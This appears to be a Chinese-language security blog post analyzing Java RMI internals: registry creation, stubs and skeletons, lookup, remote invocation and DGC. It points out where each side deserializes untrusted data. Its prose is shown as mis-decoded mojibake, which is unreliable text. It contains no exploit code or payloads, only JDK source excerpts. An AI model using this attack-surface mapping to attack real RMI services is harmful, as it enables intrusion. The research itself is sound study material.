<p>å¹¶è°ƒç”¨ <code>LiveRef#exportObject</code> æ¥ç€è°ƒç”¨ <code>sun.rmi.transport.tcp.TCPEndpoint#exportObject</code> ç›‘å¬æœ¬åœ°ç«¯å£ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111259879.png" alt="image-20241220111259879"></p>
<p>ç„¶åè°ƒç”¨<code> sun.rmi.transport.tcp.TCPTransport#exportObject</code>æ–¹æ³•å°† Target å®ä¾‹æ³¨å†Œåˆ° <strong>ObjectTable</strong> ä¸­ã€‚<strong>ObjectTable</strong> ç”¨æ¥ç®¡ç†æ‰€æœ‰å‘å¸ƒçš„æœåŠ¡å®ä¾‹ Targetï¼Œ<strong>ObjectTable</strong> æä¾›äº†æ ¹æ® <strong>ObjectEndpoint</strong> å’Œ <strong>Remote</strong> å®ä¾‹ä¸¤ç§æ–¹å¼æŸ¥æ‰¾ Target çš„æ–¹æ³•ï¼ˆä¸åŒå‚æ•°çš„ getTarget æ–¹æ³•ï¼‰ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111410861.png" alt="image-20241220111410861"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241224112759543.png" alt="image-20241224112759543"></p>
<h2 id="åˆ›å»ºæ³¨å†Œä¸­å¿ƒ"><a href="#åˆ›å»ºæ³¨å†Œä¸­å¿ƒ" class="headerlink" title="åˆ›å»ºæ³¨å†Œä¸­å¿ƒ"></a>åˆ›å»ºæ³¨å†Œä¸­å¿ƒ</h2><p><code>LocateRegistry.createRegistry(1099)</code>ï¼Œåˆ›å»ºäº†æ³¨å†Œä¸­å¿ƒï¼Œè·Ÿè¿›ã€‚</p>
<p>å¯ä»¥çœ‹åˆ° <code>createRegistry </code>æ–¹æ³•å®é™… new äº†ä¸€ä¸ª RegistryImpl å¯¹è±¡ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220112741229.png" alt="image-20241220112741229"></p>
<p><strong>RegistryImpl</strong> çš„æ„é€ æ–¹æ³•ä¸­åˆ›å»º LiveRef å¯¹è±¡ï¼Œç„¶ååˆ›å»º <strong>UnicastServerRef</strong> å¯¹è±¡ï¼Œæœ€åè°ƒç”¨ <code>setup</code> è¿›è¡Œé…ç½®ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220112845940.png" alt="image-20241220112845940"></p>
<p>åœ¨ <code>setup</code> æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ <strong>UnicastServerRef</strong> çš„ <code>exportObject </code>æ–¹æ³•å‘å¸ƒå¯¹è±¡ï¼Œå’Œåˆ›å»ºè¿œç¨‹å¯¹è±¡çš„æ—¶å€™æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯è¿™æ¬¡å‘å¸ƒçš„æ˜¯ <strong>RegistryImpl</strong> è¿™ä¸ªå¯¹è±¡ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220115543294.png" alt="image-20241220115543294"></p>
<p>åœ¨ <code>exportObject</code> æ–¹æ³•ä¸­ï¼Œé‡è¦çš„ä¸€æ­¥å°±æ˜¯ä½¿ç”¨ <code>Util.createProxy()</code> æ¥åˆ›å»ºåŠ¨æ€ä»£ç†ï¼Œä¹‹å‰æåˆ°å¯¹è¿œç¨‹å¯¹è±¡ä½¿ç”¨ <strong>RemoteObjectInvocationHandler</strong> æ¥åˆ›å»ºï¼Œä½†æ˜¯ä¹‹å‰æœ‰ä¸€ä¸ª <strong>stubClassExists</strong> çš„åˆ¤æ–­ï¼Œåˆ›å»ºè¿œç¨‹å¯¹è±¡çš„æ—¶å€™ç›´æ¥è·³è¿‡å»äº†ï¼Œè¿™é‡Œæ˜¯å¯ä»¥è¿›å…¥åˆ¤æ–­ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220115744945.png" alt="image-20241220115744945"></p>
<p>å¤§æ¦‚æ„æ€å°±æ˜¯æ‰¾æœ‰æ²¡æœ‰<code>_Stub</code>ç»“å°¾çš„ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>     <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>         <span class="hljs-keyword">try</span> &#123;<br>             Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                           <span class="hljs-literal">false</span>,<br>                           remoteClass.getClassLoader());<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>         &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>             withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœéœ€è¦åˆ›å»ºä»£ç†çš„ç±»åœ¨æœ¬åœ°æœ‰ <code>_Stub</code> çš„ç±»ï¼Œåˆ™ç›´æ¥ä½¿ç”¨ <code>createStub</code> æ–¹æ³•åå°„è°ƒç”¨ stub ç±»çš„æ„é€ æ–¹æ³•åˆ›å»ºç±»å®ä¾‹ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220115831241.png" alt="image-20241220115831241"></p>
<p>ä¸ºä»€ä¹ˆä¼šæ˜¯ <strong>RegistryImpl_Stub</strong> è¿™ä¸ªæ–‡ä»¶å‘¢ï¼Ÿå› ä¸ºç”±äºæ˜¯ <strong>RegistryImpl</strong> è¿™ä¸ªç±»ï¼Œæ‰€ä»¥ç³»ç»Ÿä¼šæ‰¾åˆ° <strong>RegistryImpl_Stub</strong> è¿™ä¸ªç±»å¹¶è¿›è¡Œå®ä¾‹åŒ–ï¼Œ<strong>RegistryImpl_Stub</strong> ç»§æ‰¿äº† <strong>RemoteStub</strong> ï¼Œå®ç°äº† <strong>Registry</strong>ã€‚è¿™ä¸ªç±»å®ç°äº† <code>bind/list/lookup/rebind/unbind</code> ç­‰ <strong>Registry</strong> å®šä¹‰çš„æ–¹æ³•ï¼Œå…¨éƒ¨æ˜¯é€šè¿‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥å®ç°çš„ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220120028974.png" alt="image-20241220120028974"></p>
<p>åˆ›å»ºå®Œä»£ç†ç±»ä¹‹åï¼Œè°ƒç”¨ setSkeleton æ–¹æ³•è°ƒç”¨ <code>Util.createSkeleton()</code> æ–¹æ³•åˆ›å»º skeletonã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220120123846.png" alt="image-20241220120123846"></p>
<p>å…¶å®å°±æ˜¯åå°„å®ä¾‹åŒ– <strong>RegistryImpl_Skel</strong> è¿™ä¸ªç±»å¹¶å¼•ç”¨åœ¨ UnicastServerRef çš„ <code>private transient Skeleton skel;</code> ä¸­ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241224165906564.png" alt="image-20241224165906564"></p>
<p>ç„¶ååˆè°ƒç”¨<code> sun.rmi.transport.tcp.TCPTransport#exportObject</code>æ–¹æ³•å°† Target å®ä¾‹æ³¨å†Œåˆ° <strong>ObjectTable</strong> ä¸­ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121224133.png" alt="image-20241220121224133"></p>
<p>æœ€åå‘å¸ƒçš„æ—¶å€™æˆ‘ä»¬æœ‰ä¸‰ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬è‡ªå·±å»ºçš„<strong>RemoteObjlmpl(æ˜¯ä¸ªä»£ç†)<strong>ã€</strong>RegistryImpl_Stub</strong>ã€<strong>DGClmpl_Stub</strong>ï¼ˆDGCâ€”â€” åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ï¼Œæˆ‘ä»¬ç°åœ¨åªç”¨çŸ¥é“å®ƒæ˜¯è‡ªåŠ¨åˆ›å»ºçš„å°±è¡Œï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121023302.png" alt="image-20241220121023302"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121036739.png" alt="image-20241220121036739"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121053100.png" alt="image-20241220121053100"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121108831.png" alt="image-20241220121108831"></p>
<p>éšåå°†æ•´ä¸ª<strong>target</strong>å‘å¸ƒå‡ºå»</p>
<p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯å¼€äº†å‡ ä¸ªè¿œç¨‹æœåŠ¡ï¼Œè¿œç¨‹æœåŠ¡å¯¹è±¡ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼Œæ³¨å†Œä¸­å¿ƒä½¿ç”¨ <strong>RegistryImpl_Stub</strong>ï¼ŒåŒæ—¶è¿˜åˆ›å»ºäº† <strong>RegistryImpl_Skel</strong>ã€‚æ³¨å†Œä¸­å¿ƒç«¯å£æ˜¯å›ºå®šäº†ï¼Œå¦å¤–ä¸¤ä¸ªç«¯å£æ˜¯ä¸å›ºå®šçš„ï¼Œéšæœºäº§ç”Ÿçš„ã€‚</p>
<h2 id="æœåŠ¡æ³¨å†Œ-1"><a href="#æœåŠ¡æ³¨å†Œ-1" class="headerlink" title="æœåŠ¡æ³¨å†Œ"></a>æœåŠ¡æ³¨å†Œ</h2><p>å…¶å®å°±æ˜¯ bind çš„è¿‡ç¨‹ï¼Œç›´æ¥è°ƒç”¨<code>sun.rmi.registry.RegistryImpl#bind</code>è¿›è¡Œç»‘å®šï¼Œå°±æ˜¯å°† Remote å¯¹è±¡å’Œåç§° String æ”¾åœ¨æˆå‘˜å˜é‡ bindings ä¸­ï¼Œbindingsæ˜¯ä¸€ä¸ªHashtable å¯¹è±¡ï¼Œæ¥ç€<code>bindings.put</code>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121720353.png" alt="image-20241220121720353"></p>
<p>â€‹	</p>
<h1 id="æœåŠ¡è°ƒç”¨"><a href="#æœåŠ¡è°ƒç”¨" class="headerlink" title="æœåŠ¡è°ƒç”¨"></a>æœåŠ¡è°ƒç”¨</h1><p>ä½¿ç”¨è¿œç¨‹æ–¹æ³•è°ƒç”¨æ—¶ä¼šæ¶‰åŠå‚æ•°çš„ä¼ é€’å’Œæ‰§è¡Œç»“æœçš„è¿”å›ï¼Œå‚æ•°æˆ–è€…è¿”å›å€¼å¯ä»¥æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡çš„å¼•ç”¨ï¼Œæ‰€ä»¥è¿™äº›éœ€è¦è¢«ä¼ è¾“çš„å¯¹è±¡å¿…é¡»å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œè¿™å°±è¦æ±‚ç›¸åº”çš„ç±»å¿…é¡»å®ç°java.io.Serializableæ¥å£å¹¶ä¸”å®¢æˆ·ç«¯çš„serialVersionUIDå­—æ®µè¦ä¸æœåŠ¡å™¨ç«¯ä¿æŒä¸€è‡´ã€‚<br>JVMä¹‹é—´é€šä¿¡æ—¶RMIï¼Œå®ƒå¹¶æ²¡æœ‰ç›´æ¥æŠŠè¿œç¨‹å¯¹è±¡å¤åˆ¶ä¸€ä»½ä¼ é€’ç»™å®¢æˆ·ç«¯ï¼Œè€Œæ˜¯ä¼ é€’äº†ä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„Stubï¼ŒStubåŸºæœ¬ä¸Šç›¸å½“äºæ˜¯è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨æˆ–è€…ä»£ç†ï¼ŒStubå¯¹å¼€å‘è€…æ˜¯é€æ˜çš„ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·ç›´æ¥é€šè¿‡å®ƒæ¥è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒStubä¸­åŒ…å«äº†è¿œç¨‹å¯¹è±¡çš„å®šä½ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šSocketç«¯å£ã€æœåŠ¡ç«¯ä¸»æœºåœ°å€ç­‰ï¼ŒåŒæ—¶ä¹Ÿå®ç°äº†è¿œç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­å…·ä½“çš„åº•å±‚ç½‘ç»œé€šä¿¡ç»†èŠ‚ï¼Œæ‰€ä»¥RMIè¿œç¨‹è°ƒç”¨é€»è¾‘æ˜¯è¿™æ ·çš„ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250103122941729.png" alt="image-20250103122941729"></p>
<h2 id="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯</h2><p>è¿™é‡Œå…¶å®æ˜¯é€šè¿‡è°ƒç”¨<strong>æœ¬åœ°åˆ›å»º</strong>çš„ <strong>RegistryImpl_Stub</strong> å¯¹è±¡ï¼Œè·Ÿåˆ›å»ºæ³¨å†Œä¸­å¿ƒçš„æµç¨‹ä¸€æ ·çš„ï¼Œéšåè°ƒç”¨<code>lookup</code>æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225110936113.png" alt="image-20241225110936113"></p>
<p>åœ¨è°ƒç”¨å…¶<code>lookup</code>æ–¹æ³•æ—¶ï¼Œä¼šå‘æ³¨å†Œä¸­å¿ƒä¼ é€’åºåˆ—åŒ–çš„ name (æ‰€ä»¥æ³¨å†Œä¸­å¿ƒä¹Ÿä¸€å®šæœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹)ï¼Œç„¶åå°† Registry ç«¯å›ä¼ çš„ç»“æœååºåˆ—åŒ–ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225111855102.png" alt="image-20241225111855102"></p>
<p>å¦å¤–è¿˜éœ€è¦æ³¨æ„çš„ä¸€ä¸ªç‚¹æ˜¯<code>invoke</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225112438854.png" alt="image-20241225112438854"></p>
<p>å®ƒå®é™…è°ƒç”¨ çš„æ˜¯<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­åˆè°ƒç”¨äº†<strong>sun.rmi.transport.StreamRemoteCall#executeCallã€‚</strong>å¦‚æœä½ æ˜¯2å·å¼‚å¸¸ï¼Œä»–ä¼šé€šè¿‡ååºåˆ—åŒ–æ¥è·å–æµé‡Œçš„å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯è¯´å¦‚æœæ³¨å†Œä¸­å¿ƒè¿”å›ä¸€ä¸ªæ¶æ„çš„æµï¼Œé‚£å®¢æˆ·ç«¯ä¹Ÿä¼šè¢«æ”»å‡»ï¼‰è¿™ä¸ªç‚¹æ›´éšè”½ï¼Œç»“è®ºå°±æ˜¯ï¼Œ<strong>RegistryImpl_Stub</strong>çš„æ–¹æ³•ä¸­è°ƒç”¨äº†<code>invoke</code>æ–¹æ³•ï¼Œéƒ½æœ‰å¯èƒ½ä¼šè¢«æ”»å‡»</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225112649941.png" alt="image-20241225112649941"></p>
<h2 id="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-æ³¨å†Œä¸­å¿ƒ"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-æ³¨å†Œä¸­å¿ƒ"></a>å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-æ³¨å†Œä¸­å¿ƒ</h2><p>æ³¨å†Œä¸­å¿ƒç«¯ä¼šèµ°åˆ°<strong>RegistryImpl_Skel</strong> çš„ <code>dispatch</code> æ–¹æ³•ï¼Œ<code>lookup</code> æ–¹æ³•å¯¹åº”çš„å€¼æ˜¯ 2 ï¼Œè°ƒç”¨ <strong>RegistryImpl</strong> çš„ <code>lookup</code>æ–¹æ³•ï¼Œç„¶åå°†æŸ¥è¯¢åˆ°çš„ç»“æœ writeObject åˆ°æµä¸­</p>
<p>è‡³äºä¸ºä»€ä¹ˆæ‰¾åˆ°<code>dispatch</code>æ–¹æ³•è¿‡ç¨‹æ¯”è¾ƒç¹çï¼Œæ¨èå¤§å®¶çœ‹è¿™ä¸€æœŸè§†é¢‘<a href="https://www.bilibili.com/video/BV1L3411a7ax?spm_id_from=333.788.videopod.episodes&vd_source=d195054a6a081ba07486dcc86c6ba707&p=6">Javaååºåˆ—åŒ–RMIä¸“é¢˜-æ²¡æœ‰äººæ¯”æˆ‘æ›´æ‡‚RMI</a></p>
<p>case2ä¹Ÿå°±æ˜¯æˆ‘ä»¬å®¢æˆ·ç«¯è°ƒç”¨çš„lookupæ–¹æ³•ï¼Œè¿™é‡Œå¯¹åº”çš„ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„nameå­—æ®µï¼Œè¿™é‡Œæ˜¯é€šè¿‡ååºåˆ—åŒ–è¯»å‡ºæ¥çš„</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225120047665.png" alt="image-20241225120047665"></p>
<p>è¿™é‡Œé¢åªè¦æœ‰readObjectæ–¹æ³•éƒ½èƒ½è¢«æ”»å‡» <code>bindã€rebindã€unbind</code></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225120219084.png" alt="image-20241225120219084"></p>
<p>æ‰€ä»¥å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒçš„æ–¹æ³•è¿˜æ˜¯å¾ˆå¤šçš„ã€‚</p>
<h2 id="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-å®¢æˆ·ç«¯</h2><p>ç›´æ¥è·Ÿè¿›sayHelloæ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225131737965.png" alt="image-20241225131737965"></p>
<p>å› ä¸ºæˆ‘ä»¬ç°åœ¨çš„å¯¹è±¡æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ï¼Œæ‰€ä»¥ä¼šèµ°åˆ°è°ƒç”¨å¤„ç†å™¨çš„invokeæ–¹æ³•  ï¼Œç„¶åä¼šè°ƒç”¨<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225131936399.png" alt="image-20241225131936399"></p>
<p><code>invokeRemoteMethod</code>æˆ‘ä»¬å‘ç°è°ƒç”¨äº†é‡è½½çš„invokeæ–¹æ³•ä¹Ÿå°±æ˜¯åˆ°äº†<code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)ã€‚</code>æœ€ç»ˆé€»è¾‘ä¼šèµ°åˆ°<strong>marchalValue</strong>ï¼Œåæ­£å®ƒæœ€ç»ˆä¹Ÿå°±æ˜¯åºåˆ—åŒ–ä¸€ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„helloï¼Œæœ€ååˆè°ƒç”¨äº†<code> java.rmi.server.RemoteCall#executeCall</code>ï¼Œè¿™é‡Œé¢ä¹Ÿæœ‰ååºåˆ—åŒ–çš„ç‚¹ï¼Œå®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯é‚£è¾¹å·²ç»æåˆ°äº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">marshalValue</span><span class="hljs-params">(Class&lt;?&gt; type, Object value,</span><br><span class="hljs-params">                                   ObjectOutput out)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>&#123;<br>    <span class="hljs-keyword">if</span> (type.isPrimitive()) &#123;<br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-type">int</span>.class) &#123;<br>            out.writeInt(((Integer) value).intValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">boolean</span>.class) &#123;<br>            out.writeBoolean(((Boolean) value).booleanValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">byte</span>.class) &#123;<br>            out.writeByte(((Byte) value).byteValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">char</span>.class) &#123;<br>            out.writeChar(((Character) value).charValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">short</span>.class) &#123;<br>            out.writeShort(((Short) value).shortValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">long</span>.class) &#123;<br>            out.writeLong(((Long) value).longValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">float</span>.class) &#123;<br>            out.writeFloat(((Float) value).floatValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">double</span>.class) &#123;<br>            out.writeDouble(((Double) value).doubleValue());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Unrecognized primitive type: &quot;</span> + type);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        out.writeObject(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225132942461.png" alt="image-20241225132942461"></p>
<p>æ¥ç€ä¼šè°ƒç”¨<code>sun.rmi.server.UnicastRef#unmarshalValue</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ç»“æœæ˜¯ååºåˆ—åŒ–å‡ºæ¥çš„</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225132501554.png" alt="image-20241225132501554"></p>
<p>è¿™é‡Œå•°å—¦ä¸€ä¸‹ã€‚</p>
<p>ä¸ºä»€ä¹ˆå®¢æˆ·ç«¯èƒ½ç›´æ¥å’ŒæœåŠ¡ç«¯é€šä¿¡å‘¢ï¼Ÿç€é‡çœ‹ä¸€ä¸‹<strong>RemoteObjectInvocationHandler</strong> è¿™ä¸ªåŠ¨æ€ä»£ç†ï¼Œç»§æ‰¿ <strong>RemoteObject</strong> å®ç° InvocationHandlerï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªå¯åºåˆ—åŒ–çš„ã€å¯ä½¿ç”¨ RMI è¿œç¨‹ä¼ è¾“çš„åŠ¨æ€ä»£ç†ç±»ã€‚æ—¢ç„¶æ˜¯åŠ¨æ€ä»£ç†ç±»ï¼Œè‡ªç„¶é‡ç‚¹å…³æ³¨ <code>invoke</code> æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯ Object çš„æ–¹æ³•ä¼šè°ƒç”¨ <code>invokeObjectMethod</code> æ–¹æ³•ï¼Œå…¶ä»–çš„åˆ™è°ƒç”¨ <code>invokeRemoteMethod</code> æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226182732893.png" alt="image-20241226182732893"></p>
<p>è€Œåœ¨ <code>invokeRemoteMethod</code> ä¸­å®é™…æ˜¯å§”æ‰˜ RemoteRef çš„å­ç±» UnicastRef çš„ <code>invoke</code> æ–¹æ³•æ‰§è¡Œè°ƒç”¨ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183022698.png" alt="image-20241226183022698"></p>
<p><strong>UnicastRef</strong> çš„ <code>invoke</code>æ–¹æ³•æ˜¯ä¸€ä¸ªå»ºç«‹è¿æ¥ï¼Œæ‰§è¡Œè°ƒç”¨ï¼Œå¹¶è¯»å–ç»“æœå¹¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚è¿™é‡Œï¼Œ<strong>UnicastRef</strong> åŒ…å«å±æ€§ <code>LiveRef</code> ï¼Œ<strong>LiveRef</strong> ç±»ä¸­çš„ Endpointã€Channel å°è£…äº†ä¸ç½‘ç»œé€šä¿¡ç›¸å…³çš„æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183650010.png" alt="image-20241226183650010"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183713660.png" alt="image-20241226183713660"></p>
<p>ååºåˆ—åŒ–æ–¹æ³•åœ¨ <code>unmarshalValue</code> ä¸­ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183852249.png" alt="image-20241226183852249"></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯æ‹¿åˆ°æœåŠ¡ç«¯è¿”å›çš„åŠ¨æ€ä»£ç†å¯¹è±¡å¹¶ä¸”ååºåˆ—åŒ–åï¼Œå¯¹å…¶è¿›è¡Œè°ƒç”¨ï¼Œè¿™çœ‹èµ·æ¥æ˜¯æœ¬åœ°è¿›è¡Œè°ƒç”¨ï¼Œä½†å®é™…ä¸Šæ˜¯åŠ¨æ€ä»£ç†çš„ <strong>RemoteObjectInvocationHandler</strong> å§”æ‰˜ <strong>RemoteRef</strong> çš„ <strong>invoke</strong> æ–¹æ³•è¿›è¡Œè¿œç¨‹é€šä¿¡ï¼Œç”±äºè¿™ä¸ªåŠ¨æ€ä»£ç†ç±»ä¸­ä¿å­˜äº†çœŸæ­£ Server ç«¯å¯¹æ­¤é¡¹æœåŠ¡ç›‘å¬çš„ç«¯å£ï¼Œå› æ­¤å®¢æˆ·ç«¯ç«¯ç›´æ¥ä¸æœåŠ¡ç«¯ç«¯è¿›è¡Œé€šä¿¡ã€‚</p>
<h2 id="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-æœåŠ¡ç«¯"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-æœåŠ¡ç«¯" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-æœåŠ¡ç«¯"></a>å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-æœåŠ¡ç«¯</h2><p>æœåŠ¡ç«¯ç”± <strong>UnicastServerRef</strong> çš„ <code>dispatch</code> æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä¼šåœ¨ <code>hashToMethod_Map.get(op)</code> ä¸­å¯»æ‰¾ Client ç«¯å¯¹åº”æ‰§è¡Œ Method çš„ hash å€¼ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™ä¼šååºåˆ—åŒ– Client ç«¯ä¼ æ¥çš„å‚æ•°ï¼Œå¹¶ä¸”é€šè¿‡åå°„è°ƒç”¨ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225134957124.png" alt="image-20241225134957124"></p>
<p>ä¼šæŠŠè¿è¡Œçš„ç»“æœï¼Œåºåˆ—åŒ–ä¹‹åä¼ ç»™å®¢æˆ·ç«¯</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225135233667.png" alt="image-20241225135233667"></p>
<h2 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h2><p>åœ¨åˆ›å»ºæ³¨å†Œä¸­å¿ƒé‚£ä¸€éƒ¨åˆ†æˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªå¯¹è±¡<strong>DGClmpl_Stub</strong>ï¼Œå®ƒæ˜¯é€šè¿‡<code>objTable.put(oe,target)</code> putè¿›å»çš„ï¼Œé‚£è‚¯å®šæ˜¯åœ¨putä¹‹å‰å°±åˆ›å»ºå¥½äº†è¿™ä¸ªå¯¹è±¡ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹å®ƒçš„åˆ›å»ºæµç¨‹ã€‚</p>
<p>æˆ‘ä»¬æ‰¾åˆ°äº†è¿™é‡Œ<code>sun.rmi.transport.ObjectTable#putTarget</code>è°ƒç”¨äº†<code> sun.rmi.transport.DGCImpl#dgcLog</code>ï¼ŒdgcLogæ˜¯ä¸€ä¸ªé™æ€å˜é‡</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225172334819.png" alt="image-20241225172334819"></p>
